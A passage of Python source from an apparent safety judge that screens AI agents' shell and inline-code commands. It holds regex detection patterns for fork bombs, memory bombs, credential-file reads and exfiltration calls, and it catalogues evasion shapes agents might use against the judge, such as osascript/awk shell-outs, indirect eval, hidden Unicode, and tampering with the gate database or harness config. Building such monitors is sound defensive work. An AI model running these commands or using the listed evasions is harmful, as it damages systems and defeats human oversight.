                        "Symlink target is a recognisable system path. "
                        "Operator-runnable (legit /var/cache or /var/log "
                        "redirection); confirm before linking."
                    ),
                ),
            )

    # CRITICAL/HIGH: mv pulling a protected source out of place.
    # Renaming a fortress file removes it from the path the gate
    # cascade expects — the file's gone from /etc/sudoers etc.
    # Two-IDs split.
    if re.search(r"\bmv\s+\S", lower):
        mv_forbidden, mv_confirmable = _classify_shell_path_tokens(
            command,
            want_after=r"\bmv\s+(?:-\S+\s+)*",
        )
        if mv_forbidden:
            verdicts.append(
                RuleVerdict(
                    "BASH_MV_FROM_PROTECTED_FORBIDDEN",
                    "critical",
                    "mv source classifies as AIDOCS / host-harness / persistence.",
                    evidence=command[:200],
                    recommendation=(
                        "Moving a fortress file out of place removes it "
                        "from the path the gate cascade expects to find. "
                        "Hard-deny."
                    ),
                ),
            )
        elif mv_confirmable:
            verdicts.append(
                RuleVerdict(
                    "BASH_MV_FROM_PROTECTED_CONFIRMABLE",
                    "high",
                    "mv source is a system path.",
                    evidence=command[:200],
                    recommendation=(
                        "Moving a system-path file is operator-runnable "
                        "but unusual; confirm before moving."
                    ),
                ),
            )
    return verdicts


def _bash_dos_service_rules(command: str, lower: str) -> list[RuleVerdict]:
    """DoS family + service-stop + network-reconfig rules (Batch 3).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Batch 3 (#46 step 5): DoS family ──

    # CRITICAL: fork bomb — classic + named + loop + PowerShell shapes.
    # Doctrine §0.5 line 38 (resource exhaustion → forbidden).
    # Use case-sensitive match against `command` (not lower) because
    # the canonical bash form is character-literal and we want to
    # avoid the fragile word-boundary semantics on `:`.
    _FORK_BOMB_PATTERNS = (
        # Classic: :(){ :|:& };:
        r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
        # Named-function variant: bomb(){ bomb|bomb& }; bomb
        r"(\w+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}\s*;\s*\1\b",
        # Bash while-true with backgrounded body (no clear exit / no read)
        r"while\s+(?:true|:)\s*;?\s*do\s+\S+[^\n]*&\s*done",
        # PowerShell while-true with hidden Start-Process (persistence
        # variant; also matches the "spawn forever" DoS shape)
        r"while\s*\(\s*\$?true\s*\)\s*\{[^}]*Start-Process",
    )
    for _pat in _FORK_BOMB_PATTERNS:
        if re.search(_pat, command, re.IGNORECASE):
            verdicts.append(
                RuleVerdict(
                    "BASH_FORK_BOMB",
                    "critical",
                    "Fork-bomb / unbounded-spawn shape detected.",
                    evidence=command[:200],
                    recommendation=(
                        "Process-spawn recursion or unbounded background "
                        "spawn loop. Hard-deny — no operator-confirm path."
                    ),
                ),
            )
            break

    # MEDIUM: find with root anchor piped to xargs — unbounded recursion
    # over the entire filesystem. Even the non-destructive form
    # (`find / | xargs ls`) burns hours of wall-clock and pollutes
    # the filesystem cache; a destructive xargs target is caught by
    # other rules. Confirmable rather than forbidden — operator may
    # legitimately want this for ad-hoc filesystem inspection.
    if re.search(
        r"\bfind\s+/\s+(?:[^|;&\n]*\s)?\|\s*xargs\b",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_FIND_XARGS_UNBOUNDED",
                "medium",
                "Root-anchored find piped to xargs — unbounded recursion.",
                evidence=command[:200],
                recommendation=(
                    "`find / … | xargs …` walks the entire filesystem. "
                    "Use a narrower starting path or pre-filter with "
                    "-maxdepth before piping."
                ),
            ),
        )

    # HIGH: service/daemon management
    #
    # #624: the middle word used to be MANDATORY (`service\s+\w+\s+stop`), so
    # `service nginx stop` matched and `aidocs service stop` — the stop that
    # DISABLES THE GOVERNANCE DAEMON — did not. The subcommand word is now
    # OPTIONAL, and `restart` counts: a restart stops the daemon first, so a
    # rule that saw only `stop` was blind to the same act under a kinder name.
    #
    # Coverage is declared as DATA in judge_taxonomy.DECLARED_COMMAND_SHAPES
    # and enforced by tests/security/test_taxonomy_pattern_parity_624.py. The
    # fix here is that gate's CONSEQUENCE — the gate is what stops a documented
    # class from naming a shape no pattern matches. Adding "aidocs" to this
    # regex would have enumerated one artefact and left the class intact.
    if re.search(
        r"\b(systemctl\s+(stop|disable|mask)"
        r"|service\s+(\w+\s+)?(stop|restart)"
        r"|sc\s+(stop|delete))\b",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_SERVICE_STOP",
                "high",
                "System service stop/disable command.",
                evidence=command[:200],
                recommendation="Do not stop system services without explicit approval.",
            ),
        )

    # MEDIUM: network reconfiguration
    if re.search(r"\b(iptables|ufw|netsh|ifconfig\s+\w+\s+down|ip\s+link\s+set.*down)\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_NETWORK_RECONFIG",
                "medium",
                "Network/firewall reconfiguration.",
                evidence=command[:200],
                recommendation="Network changes can cause connectivity loss.",
            ),
        )
    return verdicts


def _bash_inline_runtime_rules(command: str, project_root: Path | None) -> list[RuleVerdict]:
    """Constructed-language one-liner rules (python -c, node -e, ...).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Constructed language one-liners (python -c, node -e, ruby -e, etc.) ──
    # These bypass shell-level pattern matching — the judge sees "python" (allowlisted)
    # but the -c argument contains the actual destructive code.

    # Inline-code extraction. inline_code_raw preserves original casing
    # AND original codepoints — the unicode-hiding rule needs to see
    # bidi/zero-width chars before any normalization. inline_code is
    # lowercased for pattern-matching rules (existing INLINE_*).
    #
    # Order matters: try the most specific/longest invocation form first
    # so `pwsh -Command "..."` doesn't get partially matched by a future
    # broader runtime regex. Each branch captures the inline body up to
    # end-of-string (re.DOTALL).
    inline_code_raw = ""
    inline_code = ""
    _INLINE_RUNTIME_PATTERNS = (
        r"(?:python|python3)\s+-c\s+(.*)",
        r"(?:node|bun|deno)\s+-e\s+(.*)",
        # deno also has `deno eval` form (sub-command, not a flag)
        r"\bdeno\s+eval\s+(.*)",
        r"(?:ruby|perl)\s+-e\s+(.*)",
        r"\bphp\s+-r\s+(.*)",
        r"\blua\s+-e\s+(.*)",
        # PowerShell: -Command and -c (alias). Match both pwsh and
        # legacy powershell.exe. Quoted body capture handled by
        # re.DOTALL — the body is everything to end-of-line/string.
        r"(?:pwsh|powershell)\s+-(?:Command|c)\s+(.*)",
        r"\bosascript\s+-e\s+(.*)",
        # awk: -e form OR BEGIN block (the canonical inline shape).
        # `awk -e '...'` matches the same way as the others.
        r"\bawk\s+-e\s+(.*)",
        r"\bawk\s+(['\"])BEGIN\s*\{(.*?)\1",
    )
    for _pat in _INLINE_RUNTIME_PATTERNS:
        m = re.search(_pat, command, re.DOTALL | re.IGNORECASE)
        if m:
            # awk BEGIN form has the body in group 2; everything else
            # uses group 1.
            inline_code_raw = m.group(2) if m.lastindex and m.lastindex >= 2 else m.group(1)
            inline_code = inline_code_raw.lower()
            break

    # ── Step 6 item 2 (#46 audit): INLINE_SHELL_INVOKE ──
    # Shape rule, NOT content rule. Fires when a non-shell inline
    # runtime reaches OUT into the shell:
    #   osascript -e '... do shell script "..."'
    #   awk 'BEGIN { system("...") }'
    #   awk -e '... system("...") ...'
    # No inner-command recursion this batch — the threat is the
    # shell-invoke shape itself (meta-bypass routing destructive
    # text through a non-shell runtime to dodge BASH_*).
    # Doctrine §0.5 line 35 (inline-code evasion / launder /
    # subprocess) → critical / forbidden.
    # Same lane as INLINE_SUBPROCESS; both can fire on the same
    # body, no suppression.
    # Prose-stripped via shared helper so commit-msg / echo prose
    # mentioning these shapes don't trip the rule.
    _shell_invoke_scan = _strip_prose_windows(command)
    if (
        re.search(
            # osascript invoking AppleScript's `do shell script` verb
            r"\bosascript\b[^\n]*?\bdo\s+shell\s+script\b",
            _shell_invoke_scan,
            re.IGNORECASE,
        )
        or re.search(
            # awk's BEGIN block calling system(...)
            r"\bawk\b[^\n]*?\bBEGIN\b[^}]*\bsystem\s*\(",
            _shell_invoke_scan,
            re.IGNORECASE,
        )
        or re.search(
            # awk -e '... system(...) ...' (no BEGIN required)
            r"\bawk\s+-e\s+\S[^\n]*\bsystem\s*\(",
            _shell_invoke_scan,
            re.IGNORECASE,
        )
    ):
        verdicts.append(
            RuleVerdict(
                "INLINE_SHELL_INVOKE",
                "critical",
                "Inline runtime shells out via do-shell-script / system().",
                evidence=command[:300],
                recommendation=(
                    "osascript `do shell script` and awk `system()` are "
                    "the canonical 'route a shell command through a non-"
                    "shell runtime to dodge the shell judge' shapes. "
                    "Hard-deny — no operator-confirm path. Run the "
                    "shell command directly so the shell rules see it."
                ),
            ),
        )
    verdicts.extend(_inline_code_rules(command, inline_code, inline_code_raw, project_root))
    return verdicts


def _inline_code_rules(command: str, inline_code: str, inline_code_raw: str, project_root: Path | None) -> list[RuleVerdict]:
    """Rules over the extracted inline-code body (INLINE_* family).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    if inline_code:
        # CRITICAL: filesystem destruction via language runtime
        # Destructive-FS patterns in inline language runtimes. Covers:
        #   Python: shutil.rmtree, os.remove, os.removedirs, .unlink,
        #           pathlib.*.unlink
        #   Node:   fs.rm, fs.unlink, fs.rmdir, fs.rmSync, require(fs).rmXxx
        #           (the parenthesis/quotes in `require("fs").rmSync`
        #           break a plain `fs\.rm` match, so also accept
        #           `.rm(Sync|dir|)` / `.unlink` as trailing method calls)
        #   Misc:   rimraf, file.delete, fileutils.rm
        if re.search(
            r"(shutil\.rmtree|os\.removedirs|os\.remove|\.unlink\b"
            r"|rimraf|fs\.rm|fs\.\w*unlink|fs\.\w*rmdir"
            r"|\.rmsync\b|\.rmdirsync\b|\.unlinksync\b"
            r"|pathlib.*\.unlink|file\.delete|fileutils\.rm"
            # Batch 1 (#46 step 5) — runtime-native destroy verbs:
            # Deno's actual filesystem-destroy API,
            # bare unlink( for PHP and import-stripped Python,
            # PowerShell's Remove-Item with -Recurse.
            r"|deno\.remove(?:sync)?\b"
            r"|\bunlink\s*\("
            r"|remove-item\b[^\n]*-recurse)",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_FS_DESTROY",
                    "critical",
                    "Destructive filesystem operation inside inline code.",
                    evidence=command[:300],
                    recommendation="Do not use inline code to delete files. Use explicit shell commands so the judge can evaluate them.",
                ),
            )

        # CRITICAL: overwriting sensitive files
        if re.search(
            r"(open\s*\(.*\.(env|key|pem|pfx|credentials|secrets).*w|writefile.*\.(env|key|pem)|\.env.*write|\.env.*open)",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_CRED_WRITE",
                    "critical",
                    "Inline code writing to sensitive/credential file.",
                    evidence=command[:300],
                    recommendation="Do not write to credential files via inline code.",
                ),
            )

        # HIGH: subprocess/exec inside inline code (double-nesting to evade)
        if re.search(
            r"(subprocess\.(run|call|popen)|os\.(system|popen|exec)|child_process|exec\(|spawn\()",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_SUBPROCESS",
                    "high",
                    "Inline code spawning a subprocess — possible evasion of command-level checks.",
                    evidence=command[:300],
                    recommendation="Run commands directly so the judge can evaluate them.",
                ),
            )

        # HIGH: network exfiltration from inline code
        if re.search(
            r"(requests\.(get|post)|urllib|fetch\(|http\.get|net\.connect|socket\.connect)",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_NETWORK",
                    "high",
                    "Inline code making network requests — possible data exfiltration.",
                    evidence=command[:300],
                    recommendation="Network calls from inline code should be explicit, not hidden in -c/-e arguments.",
                ),
            )

        # HIGH: reading kernel/system auth files (Q-B narrow,
        # Step 6 item 1 of #46 audit). User-credential paths
        # (.ssh/, .env, .aws/, credentials) moved to
        # INLINE_SECRETS_READ's lane (#42 Phase 2 classifier-based,
        # toggle-gated per #40). This rule now owns ONLY the kernel
        # auth files where read = unconditional bypass shape.
        # inline_code is lowercased by the extractor, so the regex
        # uses lowercase literals (readfile* covers Node's
        # readFileSync after lowering). Anchor on a read-shape verb
        # immediately followed by the kernel auth path literal.
        if re.search(
            r"(?:open\s*\(|readfile\w*\s*\()\s*['\"]"
            r"/etc/(?:shadow|passwd|sudoers)\b",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_SENSITIVE_READ",
                    "high",
                    "Inline code reading kernel/system auth file (/etc/shadow|passwd|sudoers).",
                    evidence=command[:300],
                    recommendation=(
                        "Reading /etc/shadow / /etc/passwd / /etc/sudoers "
                        "from inline code is a credential-exfil shape. "
                        "Hard-block. User-credential paths (.env, .ssh/, "
                        ".aws/) go through INLINE_SECRETS_READ instead."
                    ),
                ),
            )

        # HIGH: eval/exec of dynamic code (code injection vector)
        if re.search(r"\beval\s*\(|\bexec\s*\(.*\+|compile\s*\(", inline_code):
            verdicts.append(
                RuleVerdict(
                    "INLINE_EVAL",
                    "high",
                    "Dynamic code evaluation inside inline code — possible injection.",
                    evidence=command[:300],
                    recommendation="Avoid eval/exec with dynamic input.",
                ),
            )

        # CRITICAL: AIDOCS config DB mutation shape — keyword
        # backstop. Mutation-shape backstop only; INLINE_AIDOCS_TAMPER
        # (path classifier, §4.10 of security-gates.md) is the
        # read+write authority for AIDOCS internals. This rule
        # earns its keep when the path classifier doesn't surface
        # a path literal (interpolated/dynamic strings, etc.) but
        # an explicit DB mutation shape is visible. Read access
        # to AIDOCS internals is NOT allowed by absence here —
        # it's blocked by INLINE_AIDOCS_TAMPER. Q-C resolved
        # 2026-04-26 (backlog #48).
        if re.search(r"(config_settings|aidocs\.sqlite|aidocs\.db)", inline_code) and re.search(
            r"\b(insert|update|delete|drop|alter|replace into|\.commit|\.set\()\b",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_CONFIG_TAMPER",
                    "critical",
                    "Inline code targeting AIDOCS config database (mutation shape).",
                    evidence=command[:300],
                    recommendation="Use the AIDOCS dashboard to change settings, not direct DB access.",
                ),
            )

        # CRITICAL: SQL/ORM verb targeting an AIDOCS schema table.
        # Catches the case where the path string never appears (the
        # inline code uses a connection variable or ORM session) but
        # the AIDOCS schema is named — mutate or drop. Read-only
        # SELECT is intentionally allowed BY THIS RULE; reads of
        # AIDOCS internals are blocked instead by INLINE_AIDOCS_TAMPER
        # (path classifier — §4.10 of security-gates.md). Q-C
        # resolved 2026-04-26: classifier is the single authority
        # for read+write; this rule remains a mutation-shape
        # backstop for ORM/SQL flows where the path doesn't surface.
        # Doctrine §0.5 line 36 (gate-tamper / AIDOCS internals).
        # Explicit, closed alias map. Each AIDOCS table has its
        # snake_case schema name and (where it exists) the canonical
        # SQLAlchemy/Django ORM class name. NO loose pluralization,
        # NO heuristic singular/plural inference — adding a new alias
        # requires adding an entry here. Discipline the list so
        # similar-shaped names like `StickyGrantAuditNote` don't
        # match unless explicitly mapped.
        _AIDOCS_TABLE_ALIASES = (
            "config_settings",
            "configsetting",
            "audit_events",
            "auditevent",
            "rbac_escalations",
            "rbacescalation",
            "rbac_escalation_grants",
            "rbacescalationgrant",
            "session_freeze_state",
            "sessionfreezestate",
            "sticky_grants",
            "stickygrant",
            "schema_migrations",
            "schemamigration",
            "verification_runs",
            "verificationrun",
            "lane_state",
            "lanestate",
            "lane_workers",
            "laneworker",
        )
        # Build the regex once. Alternation is order-independent for
        # \b…\b matching since each alias is a literal token; no
        # nested-prefix overlap (e.g. `stickygrant` vs longer alias).
        _aidocs_token_re = r"\b(?:" + "|".join(re.escape(a) for a in _AIDOCS_TABLE_ALIASES) + r")\b"
        if re.search(_aidocs_token_re, inline_code) and re.search(
            r"\b(?:insert|update|delete|drop|alter|replace\s+into"
            r"|truncate|\.commit\b|\.set\(|"
            # ORM-shaped mutations: Session.query(...).delete(),
            # session.add(...), .save(), .destroy(), .remove()
            r"\.(?:add|save|destroy|remove)\s*\("
            r"|\.query\([^)]*\)\.delete\b)",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_AIDOCS_TABLE_OP",
                    "critical",
                    "SQL/ORM mutation targeting an AIDOCS schema table.",
                    evidence=command[:300],
                    recommendation=(
                        "AIDOCS schema mutation from inline code is "
                        "gate-tamper surface — bypasses the audited "
                        "config tools. Hard-deny."
                    ),
                ),
            )

        # ── Batch 1 (#46 step 5): inline meta-bypass rules ──
        # Three rules layered on top of the extended runtime extraction.
        # All three operate on inline_code (lowercased) except
        # INLINE_UNICODE_HIDING which inspects inline_code_raw — bidi
        # and zero-width codepoints survive .lower() but the rule's
        # job is exactly to see what the lowered scan misses.

        # CRITICAL: indirect eval/exec via getattr/__builtins__/globals
        # The literal-keyword INLINE_EVAL rule above misses these shapes.
        # Doctrine §0.5 line 35 (inline-code evasion). Hard-deny.
        if re.search(
            r"(?:getattr\s*\([^)]*['\"](?:eval|exec|compile)['\"]"
            r"|__builtins__\s*\.\s*\w*(?:eval|exec)\w*\s*\("
            r"|globals\s*\(\s*\)\s*\.\s*get\s*\(\s*['\"](?:eval|exec)['\"])",
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_INDIRECT_EVAL",
                    "critical",
                    "Indirect eval/exec resolution inside inline code.",
                    evidence=command[:300],
                    recommendation=(
                        "Indirect resolution of eval/exec/compile is a "
                        "meta-bypass for the INLINE_EVAL keyword check. "
                        "Hard-deny, no confirm path."
                    ),
                ),
            )

        # CRITICAL: hidden-Unicode in inline body (zero-width + bidi
        # override + tag block). Phase 1 — no homoglyph detection.
        # Doctrine §0.5 line 35 + rules/security.md GlassWorm note.
        if inline_code_raw and has_hidden_unicode(inline_code_raw):
            verdicts.append(
                RuleVerdict(
                    "INLINE_UNICODE_HIDING",
                    "critical",
                    "Hidden-Unicode characters inside inline code body.",
                    evidence=command[:300],
                    recommendation=(
                        "Zero-width / bidi-override / tag-block codepoints "
                        "in an executable inline body are a code-smuggling "
                        "pattern. Strip them or run the code from an "
                        "auditable file."
                    ),
                ),
            )

        # HIGH: obfuscated destructive verb via adjacent-literal concat.
        # Re-runs the existing destructive-verb regex against an
        # inline_code that has had adjacent string literals collapsed.
        # If the post-normalize match fires AND the un-normalized form
        # did NOT trigger the underlying critical rule, we know the
        # operator concatenated to dodge the keyword check.
        # Confirmable rather than forbidden — concat is sometimes
        # legitimate (i18n, dynamic path building); the verdict
        # asks the operator to ack the unusual shape.
        _normalized = re.sub(
            r"(['\"])([^'\"]*)\1\s*\+\s*(['\"])([^'\"]*)\3",
            lambda m: m.group(1) + m.group(2) + m.group(4) + m.group(1),
            inline_code,
        )
        # Iterate the collapse so 3+ chained literals also normalize.
        for _ in range(4):
            _next = re.sub(
                r"(['\"])([^'\"]*)\1\s*\+\s*(['\"])([^'\"]*)\3",
                lambda m: m.group(1) + m.group(2) + m.group(4) + m.group(1),
                _normalized,
            )
            if _next == _normalized:
                break
            _normalized = _next
        # Re-test the destructive-verb signature against normalized form.
        # Match against a token that shouldn't appear in legitimate
        # concat patterns: rm -rf, shutil.rmtree, fs.rmSync, etc.
        if _normalized != inline_code and re.search(
            r"(?:shutil\.rmtree|os\.remove(?:dirs)?|rimraf|fs\.rm"
            r"|\bsubprocess\.|\beval\s*\(|\bexec\s*\("
            r"|['\"]\s*rm\s+-[rRf])",
            _normalized,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_OBFUSCATED_VERB",
                    "high",
                    "String-concat hiding a destructive verb in inline code.",
                    evidence=command[:300],
                    recommendation=(
                        "Adjacent-literal concat that resolves to rm/eval/"
                        "subprocess shape suggests dodging the keyword "
                        "checks. Confirm the intent or refactor."
                    ),
                ),
            )

        # CRITICAL: memory bomb in inline code (#46 step 5 / Batch 3).
        # Doctrine §0.5 line 38 (resource exhaustion → forbidden).
        # Anchored on an *allocator context* — the rule fires only
        # when the bomb-shape integer participates in a sequence
        # multiply (`'a' * 10**12`, `[None] * 10**11`) or in a call
        # to a buffer/array allocator (`bytes(...)`, `Buffer.alloc(...)`,
        # `bytearray(...)`, `array(...)`). Standalone `10**12` inside
        # a string literal (e.g. `print('10**12 is huge')`) never
        # reaches an allocator, so the rule does not fire.
        # Threshold: 10**9 items / 1e9 literal — benign scientific
        # work peaks at 10**6 or 10**7; 10**9+ is implausible.
        _BOMB_INT = (
            # 10**9 or higher (decimal exponent ≥ 9)
            r"(?:10\s*\*\*\s*(?:[1-9]\d|9))"
            # exponent 10..99 (covers 10**10 etc.)
            r"|(?:10\s*\*\*\s*[1-9]\d)"
            # literal 1_000_000_000 or larger (≥10 digits)
            r"|(?:[1-9]\d{8,})"
            # 1eN scientific notation, N≥9
            r"|(?:1e\d{2,})"
            r"|(?:1e[9-9])"
        )
        # (a) sequence multiply: '<str>' * BOMB or [<list>] * BOMB
        # or b'<bytes>' * BOMB
        _MEM_BOMB_MUL = (
            r"(?:b?['\"][^'\"]*['\"]|\[[^\]]+\])"
            r"\s*\*\s*(?:" + _BOMB_INT + r")"
        )
        # (b) allocator call: bytes(BOMB), bytearray(BOMB),
        # Buffer.alloc(BOMB), array(...,BOMB), np.zeros(BOMB), etc.
        _MEM_BOMB_ALLOC = (
            r"\b(?:bytes|bytearray|memoryview|array|"
            r"buffer\.alloc(?:unsafe)?|np\.(?:zeros|ones|empty|full))"
            r"\s*\(\s*(?:" + _BOMB_INT + r")"
        )
        if re.search(_MEM_BOMB_MUL, inline_code) or re.search(
            _MEM_BOMB_ALLOC,
            inline_code,
        ):
            verdicts.append(
                RuleVerdict(
                    "INLINE_MEMORY_BOMB",
                    "critical",
                    "Memory-bomb shape inside inline code body.",
                    evidence=command[:300],
                    recommendation=(
                        "Allocations of 10**9+ elements / bytes from "
                        "inline code are a DoS pattern. If this is real "
                        "scientific work, run from a script the operator "
                        "audited."
                    ),
                ),
            )

        verdicts.extend(_inline_protected_path_rules(inline_code, project_root))
    return verdicts


def _inline_protected_path_rules(inline_code: str, project_root: Path | None) -> list[RuleVerdict]:
    """Protected-path classifier rules over inline code (#42 Phase 2).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── #42 Phase 2: protected-path classifier rules ──
    # These fire when inline code references paths classified as
    # AIDOCS internals, host harness config, persistence
    # mechanisms, .git, or secrets. Each class routes per #36:
    #   forbidden_*       → flat-deny, no confirm (catch-forbidden)
    #   confirmable_git   → freeze pipeline (operator confirms)
    #   secrets_gated     → flat-deny when setting is False;
    #                       rule does not fire when True
    # Path normalization handles ~ expansion, separator
    # variations, case-insensitive on Windows, etc.
    try:
        from .protected_paths_classifier import (
            CLASS_CONFIRMABLE_GIT,
            CLASS_FORBIDDEN_AIDOCS,
            CLASS_FORBIDDEN_HOST_HARNESS,
            CLASS_FORBIDDEN_PERSISTENCE,
            CLASS_SECRETS_GATED,
            classify_path,
            extract_paths_from_inline_code,
        )

        # Allow operator to grant secrets-read in inline code
        # explicitly. Without the toggle, secrets paths refuse.
        allow_secrets = False
        if project_root is not None:
            try:
                from .config import get_setting as _get_cfg

                allow_secrets = bool(
                    _get_cfg(
                        "security.allow_secrets_in_inline_code",
                        project_root=project_root,
                        default=False,
                    ),
                )
            except Exception:
                allow_secrets = False
        for candidate in extract_paths_from_inline_code(inline_code):
            pc = classify_path(
                candidate,
                project_root=project_root,
            )
            if pc.classification == CLASS_FORBIDDEN_AIDOCS:
                verdicts.append(
                    RuleVerdict(
                        "INLINE_AIDOCS_TAMPER",
                        "critical",
                        f"Inline code targeting AIDOCS internals: {pc.reason}",
                        evidence=candidate[:200],
                        recommendation=(
                            "AIDOCS internals are gate-tamper surface; "
                            "no inline-code touches allowed. Use the "
                            "audited config tools."
                        ),
                    ),
                )
            elif pc.classification == CLASS_FORBIDDEN_HOST_HARNESS:
                verdicts.append(
                    RuleVerdict(
                        "INLINE_HOST_HARNESS_TAMPER",
                        "critical",
                        f"Inline code targeting host harness config: {pc.reason}",
                        evidence=candidate[:200],
                        recommendation=(
                            "Host harness config (.claude, .opencode, "
                            "etc.) is hook/gate surface; mutating it "
                            "from inline code defeats the audit chain."
                        ),
                    ),
                )
            elif pc.classification == CLASS_FORBIDDEN_PERSISTENCE:
                verdicts.append(
                    RuleVerdict(
                        "INLINE_PERSISTENCE_TAMPER",
                        "critical",
                        f"Inline code targeting persistence mechanism: {pc.reason}",
                        evidence=candidate[:200],
                        recommendation=(
                            "Shell startup, cron, systemd, sudoers, "
                            "etc. are persistence surfaces; no inline-"
                            "code touches allowed."
                        ),
                    ),
                )
            elif pc.classification == CLASS_CONFIRMABLE_GIT:
                # Routes to freeze pipeline via operator-intent
                # match in orchestrator. Operator confirms each
                # touch via #39 freeze envelope.
                verdicts.append(
                    RuleVerdict(
                        "INLINE_GIT_TOUCH",
                        "high",
                        f"Inline code touching .git internals: {pc.reason}",
                        evidence=candidate[:200],
                        recommendation=(
                            "Use git CLI commands rather than inline "
                            "scripts. Operator confirmation required."
                        ),
                    ),
                )
            elif pc.classification == CLASS_SECRETS_GATED:
                # Design 2: toggle off = forbidden (critical, no
                # confirm path). Toggle on = confirmable (high,
                # routes through operator-intent → freeze in
                # orchestrator). Operator opting in still
                # confirms each invocation.
                risk_level = "high" if allow_secrets else "critical"
                rec = (
                    "Operator approved this category — confirm this specific invocation."
                    if allow_secrets
                    else "Reading credentials in inline scripts is "
                    "blocked by default. Operator can enable via "
                    "security.allow_secrets_in_inline_code for "
                    "legitimate workflows (CI runners, deploy "
                    "pipelines); each invocation still confirms."
                )
                verdicts.append(
                    RuleVerdict(
                        "INLINE_SECRETS_READ",
                        risk_level,
                        f"Inline code touching secrets path: {pc.reason}",
                        evidence=candidate[:200],
                        recommendation=rec,
                    ),
                )
    except Exception:
        # Classifier failure must not block legit work — fall
        # through. The pre-existing INLINE_* pattern rules above
        # still catch the most dangerous cases.
        pass
    return verdicts




def _check_git_rules(
    command: str,
    *,
    provider: str = "bash",
    transport: str = "ai_run",
) -> list[RuleVerdict]:
    """Rules for git operations."""
    verdicts: list[RuleVerdict] = []
    # Judge the EXECUTABLE SURFACE: data-only windows (git -m/-F message
    # payloads, heredoc bodies) are masked so a commit message that QUOTES
    # `rm -rf /` / `$(rm x)` / `curl|sh` is not judged as executing it. Real
    # execution outside the data window stays visible. Masked regions never
    # fire a rule, so `evidence=command[:200]` stays accurate.
    from .shell_data_windows import mask_data_windows

    command = mask_data_windows(command)
    lower = command.lower()

    # HIGH: force push
    if re.search(r"git\s+push\s+.*--force(?!-with-lease)", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_FORCE_PUSH",
                "high",
                "Force push can overwrite remote history.",
                evidence=command[:200],
                recommendation="Use --force-with-lease for safer force pushes.",
            ),
        )

    # HIGH: hard reset
    if "git" in lower and "reset" in lower and "--hard" in lower:
        verdicts.append(
            RuleVerdict(
                "GIT_RESET_HARD",
                "high",
                "Hard reset discards uncommitted changes.",
                evidence=command[:200],
                recommendation="Stash or commit changes before resetting.",
            ),
        )

    # HIGH: checkout that discards changes (git checkout ., git checkout -- ., git checkout HEAD)
    if re.search(r"git\s+checkout\s+(--\s+\.|head|origin/|\.)", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_CHECKOUT_OVERWRITE",
                "high",
                "Checkout that may overwrite working tree files.",
                evidence=command[:200],
            ),
        )

    # MEDIUM: git clean
    if re.search(r"git\s+clean\s+-[fdxX]", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_CLEAN",
                "medium",
                "Git clean removes untracked files.",
                evidence=command[:200],
            ),
        )

    # MEDIUM: branch delete
    if re.search(r"git\s+branch\s+-[dD]", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_BRANCH_DELETE",
                "medium",
                "Branch deletion.",
                evidence=command[:200],
            ),
        )

    # MEDIUM: stash drop (loses stashed work)
    if re.search(r"git\s+stash\s+(drop|clear)", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_STASH_DROP",
                "medium",
                "Dropping stashed changes — work may be lost.",
                evidence=command[:200],
            ),
        )

    # MEDIUM: force-with-lease (safer but still a force push)
    if re.search(r"git\s+push\s+.*--force-with-lease", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_FORCE_LEASE",
                "medium",
                "Force push with lease — safer but still overwrites remote.",
                evidence=command[:200],
            ),
        )

    # HIGH: git restore that discards changes
    if re.search(r"git\s+restore\s+(--staged\s+)?(\.|--)", lower):
        verdicts.append(
            RuleVerdict(
                "GIT_RESTORE_DISCARD",
                "high",
                "Restore that discards uncommitted changes.",
                evidence=command[:200],
            ),
        )

    # ── Batch 7 (#46 step 5): git refspec abuse family ──
    # Three syntax-specific rules. No broad "git push scary" overreach
    # — each rule's regex is tied to a precise refspec/mirror shape.
    # All FP-stripped via the shared prose-window helper so
    # `git commit -m "git push --delete …"` stays clean.
    _git_scan = _strip_prose_windows(command)

    # HIGH: delete remote ref. Two real shapes:
    #   git push <remote> :<refspec>      (colon-prefix shorthand)
    #   git push --delete|-d <remote> <ref>
    # The colon-prefix form is detected by `:[^/\s]` immediately
    # following an arg boundary inside a `git push` invocation —
    # specifically NOT preceded by a non-whitespace token (which
    # would mean `src:dst` source/destination form, NOT delete).
    if re.search(
        # `git push ... :<refspec>` — leading colon at arg start.
        # Anchor on whitespace before the colon and require non-/
        # immediately after (rules out `:/` URI shapes).
        r"\bgit\s+push\b[^|;&\n]*?\s:[^\s/]",
        _git_scan,
    ) or re.search(
        # `git push --delete <remote> <ref>` / `git push -d ...`
        r"\bgit\s+push\b[^|;&\n]*?\s(?:--delete|-d)\s+\S+\s+\S",
        _git_scan,
    ):
        verdicts.append(
